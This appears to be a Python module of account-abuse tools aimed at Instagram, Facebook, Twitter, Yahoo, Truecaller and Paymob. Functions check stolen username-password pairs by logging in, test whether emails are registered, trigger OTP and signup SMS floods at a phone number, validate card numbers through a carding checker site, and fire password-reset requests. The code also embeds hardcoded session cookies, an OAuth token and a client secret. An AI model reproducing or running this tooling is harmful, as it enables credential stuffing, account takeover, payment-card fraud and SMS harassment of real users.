try:
	import requests
	from user_agent import generate_user_agent
	import hashlib
	import os
	import instaloader
	import json
	from uuid import uuid4
	import uuid
	import random
except ModuleNotFoundError:
	import os
	os.system("pip install instaloader")
	os.system("pip install user_agent")
	os.system("pip install uuid4")
try:
	import requests  ,re, os , sys , random , uuid , user_agent , json,secrets
	from uuid import uuid4
	from user_agent import generate_user_agent
	
except ImportError:
	os.system('pip install requests')
	os.system('pip install user_agent')
	
class Hamody:
	
	def Instagram(email,password):
		uid = uuid4()
		agents =["Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)"]
		agent = random.choice(agents)
		url = "https://i.instagram.com/api/v1/accounts/login/"
		
		headers = {
    "Content-Length": "278",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": agent,
    "Cookie": "ds_user_id\u003d54081338738; mid\u003dYrzWBwABAAHGbxxkzuC2P5KGdlwp",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG, en-US",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"}
        
		data = {
		'uuid':str(uuid4()),
		'password':password,
		'username':email, 
		'device_id':str(uuid4()),
		'from_reg':'false', 
		'_csrftoken':'missing', 
		'login_attempt_countn':'0'}
		
		login = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
		
		if str("logged_in_user") in login.text:

			
			return True
			
		if str('"message":"challenge_required","challenge"') in login.text:
			
			return False
			
		else:
			
			return None
	
	def Get_Headers(url):
		re = requests.get(f"https://hamodyi.herokuapp.com/get-headers/?Url={url}").json()
		return re
	def Call(number):
		asa = '123456789'
		gigk = str(''.join(random.choice(asa) for i in range(10)))
		md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
		headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }
		url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
		data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+md5+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"etisalat"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"etisalat"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+number+'","region":"region-2","sequenceNo":1}'
		re = requests.post(url, headers=headers, data=data).json()
		msg = re["message"]
		if msg=="Sent":
			return True
		elif msg=="Secret token pending":
			return "Please Wait 5 seconds"
		else:
			return False
	def Proxy(proxy):
		url = f"http://api.dlyar-dev.tk/cproxy?p={proxy}"
		re = requests.get(url)
		if '"working": true,' in re.text:
			ip = re.json()["ip"]
			count = re.json()["country"]
			port = re.json()["port"]
			type = re.json()["type"]
			return {"status":True,"ip":ip,"country":count,"port":port,"type":type}
		if "Sorry this is not proxy" in re.text:
			return {"status":False}
		else:
			return {"status":False}
	def Spam(number):
		if "+2011" in number or "+2010" in number or "+2012" in number or "+2015" in number or "2011" in number or "2010" in number or "2012" in number or "2015" in number:
			url = "https://accept.paymob.com/api/auth/register/phone_number_signup?gclid=EAIaIQobChMI-I2_jqP-9wIVk5BoCR01LwnOEAAYASABEgLY_PD_BwE"
			data = {
  "phone_number":number,
  "country_code": "EGY",
  "phone_country_code": "+964",
  "dashboard": "true"
}
			req = requests.post(url,data=data)
			if req.json()["message"]== "This phone number was already registered but not verified. Otp sent for verification." or "Account registration successful":
				return True
			else:
				return False
	def Visa(visa):
		url = "https://checker.visatk.com/ccn1/alien07.php"
		headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection':'keep-alive',
    'Content-Length': '57',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie':'__gads=ID=42ac6c196f03a9b4-2279e5ef3fcd001d:T=1645035753:RT=1645035753:S=ALNI_MZL7kDSE4lwgNP0MHtSLy_PyyPW3w; PHPSESSID=tdsh3u2p5niangsvip3gvvbc12',
    'Host':'checker.visatk.com',
    'Origin': 'https://checker.visatk.com',
    'Referer': 'https://checker.visatk.com/ccn1/',
    'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': generate_user_agent(),
    'X-Requests-With':'XMLHttpRequest'}
		data = {
    'ajax':'1',
    'do':'check',
    'cclist':visa
    }
		req = requests.post(url, headers=headers, data=data)
		if '"error":0' in req.text:
			ss = req.text.split("[Charge :<font color=green>")[1].split("</font>] [BIN:")[0]
			return f"True {visa} {ss}"
		if '"error":-1' in req.text:
			return False
		else:
			return False
	def Reset(email):
		try:	
			uid = uuid4()
			agents =["Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)"]
			agent = random.choice(agents)
			url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
			headers = {
	    "Content-Length": "317",
	    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
	    "Host": "i.instagram.com",
	    "Connection": "Keep-Alive",
	    "User-Agent": agent,
	    "Cookie": f"mid={uid}",
	    "Cookie2": "$Version\u003d1",
	    "Accept-Language": "ar-EG, en-US",
	    "X-IG-Connection-Type": "MOBILE(LTE)",
	    "X-IG-Capabilities": "AQ\u003d\u003d",
	    "Accept-Encoding": "gzip"
		}
			data = {
	"ig_sig_key_version":"4",
	"user_email":email,
	"device_id":uid,
	"guid":uid,
		}
			req = requests.post(url,headers=headers,data=data)
			if req.json()["status"]=="ok":
				return True
			else:
				return False
		except:
			return False
	def Check_Instagram(email):
		uid = uuid4()
		agents =["Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)","Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)"]
		agent = random.choice(agents)
		url = "https://i.instagram.com/api/v1/accounts/login/"
		headers = {
    "Content-Length": "339",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": agent,
    "Cookie": f"mid={uid}",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG, en-US",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"
		}
		data = {'uuid':uid,  'password':'@Hamody666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
		req = requests.post(url,headers=headers,data=data).json()
		if "لتأمين حسابك، قمنا بإعادة تعيين كلمة السر. اضغط" in req:
			return True
		elif req["message"]=="يبدو أن اسم المستخدم الذي تم إدخاله لا ينتمي لأي حساب. يرجى التحقق من اسم المستخدم وإعادة المحاولة.":
			return False
		elif req["message"]=="كلمة السر التي أدخلتها غير صحيحة. يرجى إعادة المحاولة":
			return True
		elif req["message"]=="معلمات غير صالحة":
			return False
		else:
			return False
	def Facebook(username,password):
		uid = uuid4()
		requests.urllib3.disable_warnings()
		url = "https://b-graph.facebook.com/auth/login"
		headers = {
		"authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
		"user-agent": "Dalvik/2.1.0 (Linux; U; Android 10; BLA-L29 Build/HUAWEIBLA-L29S) [FBAN/MessengerLite;FBAV/305.0.0.7.106;FBPN/com.facebook.mlite;FBLC/ar_PS;FBBV/372376702;FBCR/Ooredoo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/BLA-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2040};]"
	}
		data = f"email={username}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uid}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
		response = requests.post(url, data=data, headers=headers, verify=False, timeout=15).json()
		if list(response)[0] == "session_key":
			return True
		else:
			try:
				return False
			except:
				return False
	
	def Twitter(username,password):
		url="https://twitter.com/sessions"
		data={'redirect_after_login': '/',
      'remember_me': '1',
      'authenticity_token': '10908ac0975311eb868c135992f7d397',
      'wfa': '1',
     'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
     'session[username_or_email]': username,
     'session[password]': password}
		headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
      'Content-Length': '901',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
      'Host': 'twitter.com',
     'Origin': 'https://twitter.com',
     'Referer': 'https://twitter.com/login?lang=ar',
     'TE': 'Trailers',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': generate_user_agent()}
		req = requests.post(url,headers=headers,data
 =data)
		if ("ct0") in req.cookies:
			return True
		elif ("error") in req.text:
			return False
	def Yahoo(email):
		eml = str(email)
		email=eml.replace('@yahoo.com','')
		url = 'https://login.yahoo.com/account/module/create?validateField=yid'
		headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Length': '17973',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
    'Host': 'login.yahoo.com',
    'Origin': 'https://login.yahoo.com',
    'Referer': 'https://login.yahoo.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'sec-ch-ua-mobile': '?0',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': str(generate_user_agent()),
    'X-Requested-With': 'XMLHttpRequest'}
		data = {
    'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
    'specId': 'yidreg',
    'crumb': 'rak/FdAmWa5',
    'acrumb': '9z9sgq95',
    'done': 'https://www.yahoo.com',
    'attrSetIndex': '0',
    'tos0': 'oath_freereg|xa|ar-JO',
    'yid': email,
    'password': 'zaidkaream1',
    'shortCountryCode': 'AF',}
		response = requests.post(url,headers=headers,data=data).text
		if ('"yid"') in response:
			return False
		elif ('"birthDate"') in response:
			return True
		else:
			return False
	def get(user,sessionid):
		L = instaloader.Instaloader()
		profile = str(instaloader.Profile.from_username(L.context,user))
		idd=str(profile.split(')>')[0])
		iid = idd.split(' (')[1]
		url = "https://i.instagram.com/api/v1/users/"+str(iid)+"/info/"
		headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "cookie": "ig_did=57C594DF-134B-4172-BCF1-C32A7A21989B; mid=X_sqxgALAAE7joUQdF9J2KQUb0bw; ig_nrcb=1; shbid=2205; shbts=1614954604.1671221; fbm_124024574287414=base_domain=.instagram.com; csrftoken=hE6dtVq6z7Zozo4yfyVPOpTJNEktuPky; rur=FRC; ds_user_id=46430696274; sessionid=" + sessionid + "",
	"sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
	"sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "none",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"}
		data = ""
		response = requests.Session().get(url, data=data, headers=headers).json()
		if response['user']['is_business'] == True and str(response['user']['public_email']) != "":
			email = str(response['user'].get('public_email'))
			if str("@") in email:
				print(email)
			else:
				return False
		else:
			return False
	